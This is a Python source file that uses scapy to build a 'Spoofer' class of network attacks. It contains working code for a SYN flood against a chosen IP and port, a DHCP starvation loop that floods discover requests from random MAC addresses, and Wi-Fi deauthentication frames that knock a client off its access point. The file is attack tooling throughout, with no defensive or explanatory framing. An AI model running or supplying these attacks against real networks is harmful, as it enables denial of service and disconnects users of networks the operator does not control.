from scapy.all import *
class Spoofer():
    
    def __init__(self, interface):
        self.interface = interface
        self.__running = False

    def stop(self):
        self.__running = False

    def syn_flood(self,target, port):
        self.__running = True

        ip = IP(dst=self.target.get_ip())

        tcp = TCP(sport=RandShort(), dport=port, flags="S")

        raw = Raw(b"X"*1024)
        p = ip / tcp / raw

        while self.__running:
            self.interface.send_packet(p)

    #https://github.com/davidbombal/scapy/blob/main/dhcp-exhaustion-more-complex.py
    def dhcp_starvation(self): #wait for a while
        self.__running = True

        conf.checkIPaddr = False

        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                            /IP(src='0.0.0.0',dst='255.255.255.255') \
                            /UDP(sport=68,dport=67) \
                            /BOOTP(op=1,chaddr = RandMAC()) \
                            /DHCP(options=[('message-type','discover'),('end')])

        while self.__running:
            self.interface.send_packet(dhcp_discover)
            time.sleep(1)

    def __deauthentication_ap(self):

        pkt = RadioTap() / Dot11(addr1=self.router_mac, addr2=self.device_mac, addr3=self.device_mac) / Dot11Deauth(reason=7)

        return pkt


    def __deauthentication_cl(self):

        pkt = RadioTap() / Dot11(addr1=self.device_mac, addr2=self.router_mac, addr3=self.router_mac) / Dot11Deauth(reason=7)

        return pkt
    
    def deauthentication(self, router, device, loops):
        self.router_mac = router.get_mac() #"14:ae:db:a3:22:95" "be:39:2e:b1:eb:85"
        self.device_mac = device.get_mac()

        #self.interface.monitor_mode()
        #self.interface.set_channel(router.get_channel())
        for loop in range(loops):
            sendp(self.__deauthentication_ap(), iface=self.interface.get_name(), count=1, inter=.2, verbose=1)
            sendp(self.__deauthentication_cl(), iface=self.interface.get_name(), count=1, inter=.2, verbose=1)
        #self.interface.managed_mode()

